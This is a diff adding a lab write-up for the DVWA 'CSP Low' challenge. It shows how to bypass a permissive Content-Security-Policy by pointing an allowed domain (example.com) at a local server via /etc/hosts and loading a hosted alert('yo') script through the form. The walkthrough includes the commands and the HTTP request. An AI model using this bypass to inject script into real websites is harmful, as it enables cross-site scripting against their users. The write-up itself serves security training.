@@ -1,0 +1,111 @@
+#+TITLE: DVWA - CSP Low
+#+AUTHOR: Leonardo Tamiano
+
+* Description
+  When we request the page the server sends us the following headers
+
+  #+begin_example
+HTTP/1.1 200 OK
+Date: Fri, 10 Nov 2023 18:06:56 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
+Vary: Accept-Encoding
+Content-Length: 4275
+Connection: close
+Content-Type: text/html;charset=utf-8
+  #+end_example
+
+  Notice the ~Content-Security-Policy~ header, with its values
+
+  #+begin_example
+script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
+  #+end_example
+
+  this tells us that we can load javascript sources from:
+
+  - https://pastebin.com
+  - example.com
+  - code.jquery.com
+  - https://ssl.google-analytics.com
+  
+* Solution
+  We first try to create an entry from https://pastebin.com, however
+  this does not work because the official pastebin server returns the
+  following HTTP headers
+
+  #+begin_example
+HTTP/2 200 OK
+Date: Fri, 10 Nov 2023 18:09:59 GMT
+Content-Type: text/plain; charset=utf-8
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1;mode=block
+Cache-Control: public, max-age=1801
+Cf-Cache-Status: EXPIRED
+Last-Modified: Fri, 10 Nov 2023 17:56:46 GMT
+Vary: Accept-Encoding
+Server: cloudflare
+Cf-Ray: 82403fecc8a499c8-CDG
+
+alert("yo");
+  #+end_example
+
+  what makes this attack not work its the ~X-Content-Type-Options~ value.
+
+  -------------
+
+  To actually make it working we can abuse the other domain, the
+  ~example.com~ domain. In particular, we edit our ~/etc/hosts~ filename
+  (this, from a threat-modelling perspective, would require us as the
+  attacker to change the DNS records of the victim client) and we
+  insert the following lines
+
+  #+begin_example
+127.0.0.1 evil example.com
+  #+end_example
+
+  Then we write the following simple javascript script named ~low.js~
+
+  #+begin_src js
+alert("yo");
+  #+end_src
+
+  and finally we start an HTTP server with python
+
+  #+begin_example
+$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+  #+end_example
+
+  Finally, we go to the form and put the following payload
+
+  #+begin_example
+http://example.com/low.js
+  #+end_example
+
+  and this lets us execute our javascript file.
+
+  The actual HTTP request is
+
+  #+begin_example
+POST /vulnerabilities/csp/ HTTP/1.1
+Host: evil:90
+Content-Length: 41
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+Origin: http://evil:90
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil:90/vulnerabilities/csp/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=2ggdg07lmkgjmbo2s590f2rn07; security=low
+Connection: close
+
+include=http%3A%2F%2Fexample.com%2Flow.js
+  #+end_example
